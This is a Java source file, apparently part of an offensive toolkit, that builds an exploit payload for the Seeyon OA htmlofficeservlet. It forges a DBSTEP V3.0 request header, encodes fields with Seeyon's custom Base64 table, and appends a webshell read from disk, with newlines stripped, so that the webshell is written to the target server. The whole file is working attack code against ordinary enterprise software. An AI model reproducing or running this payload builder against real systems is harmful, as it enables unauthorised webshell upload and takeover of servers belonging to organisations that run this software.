package com.droplab.Controller.Seeyon.Common;

import com.droplab.Utils.CommonUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Iterator;

public class HtmlOfficeServletPayload {
    private static String TableBase64 = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6";
    private static String TableBase60 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    public static String getPayload(HashMap hashMap, String filepath, int count) {
        try {
            StringBuilder stringBuilder = new StringBuilder();
            Iterator iterator = hashMap.keySet().iterator();
            while (iterator.hasNext()) {
                String key = (String) iterator.next();
                String value = (String) hashMap.get(key);
                stringBuilder.append(String.format("%s=%s\r\n", key, EncodeBase64(value)));
            }
            for (int i = 0; i < count; i++) {
                stringBuilder.append(CommonUtils.Random());
            }
            stringBuilder.append("\r\n");

            int BodySize = stringBuilder.toString().length() + 17;
            int FileSize = 0;
            StringBuilder FileString = new StringBuilder();
            if (new File(filepath).exists()){
                byte[] bytes = Files.readAllBytes(new File(filepath).toPath());
                byte[] tmp = new byte[bytes.length];
                int k = 0;
                for (int i = 0, j = 0; i < bytes.length; i++) {
                    if (bytes[i] == 13 || bytes[i] == 10) {
                        k++;
                        continue;
                    }
                    tmp[j++] = bytes[i];  //这一步是去除webshell中的换行符合，转换为一行
                }
                byte[] shell = new byte[bytes.length - k];
                for (int i = 0; i < bytes.length - k; i++) {
                    shell[i] = tmp[i];
                }

                //StringBuilder FileString = new StringBuilder();
                FileString.append("server....").append(new String(shell));
                for (int i = 0; i < 10; i++) {
                    FileString.append(CommonUtils.Random());
                }
            }else {
                FileString.append("server....");
            }
            FileSize = FileString.toString().length();


            StringBuilder payload = new StringBuilder();
            payload.append("DBSTEP V3.0    "); //0，14
            payload.append(" "); //15
            String strBodySize = String.valueOf(BodySize);
            String strFileSize = String.valueOf(FileSize);
            payload.append(String.format("%s%s", strBodySize, getSpace(15 - strBodySize.length()))); //16-30
            payload.append(" "); //31
            payload.append(String.format("%s%s", "0", getSpace(14))); //32-46
            payload.append(" "); //47
            payload.append(String.format("%s%s", strFileSize, getSpace(15 - strFileSize.length()))); //48-62
            payload.append(" "); //63
            payload.append("DBSTEP=OKMLlKlV\r\n");
            payload.append(stringBuilder);
            payload.append(FileString);
            return payload.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }



    public static String getSpace(int length) {
        StringBuilder str = new StringBuilder();
        for (int i = 0; i < length; i++) {
            str.append(" ");
        }
        return str.toString();
    }

    public static String EncodeBase64(String var1) {
        ByteArrayOutputStream var2 = new ByteArrayOutputStream();
        byte[] var7 = new byte[4];

        try {
            int var4 = 0;
            byte[] var6 = var1.getBytes(StandardCharsets.UTF_8);

            while(var4 < var6.length) {
                byte var5 = var6[var4];
                ++var4;
                var7[0] = (byte)((var5 & 252) >> 2);
                var7[1] = (byte)((var5 & 3) << 4);
                if (var4 < var6.length) {
                    var5 = var6[var4];
                    ++var4;
                    var7[1] += (byte)((var5 & 240) >> 4);
                    var7[2] = (byte)((var5 & 15) << 2);
                    if (var4 < var6.length) {
                        var5 = var6[var4];
                        ++var4;
                        var7[2] = (byte)(var7[2] + ((var5 & 192) >> 6));
                        var7[3] = (byte)(var5 & 63);
                    } else {
                        var7[3] = 64;
                    }
                } else {
                    var7[2] = 64;
                    var7[3] = 64;
                }

                for(int var3 = 0; var3 <= 3; ++var3) {
                    var2.write(TableBase64.charAt(var7[var3]));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return var2.toString();
    }
}
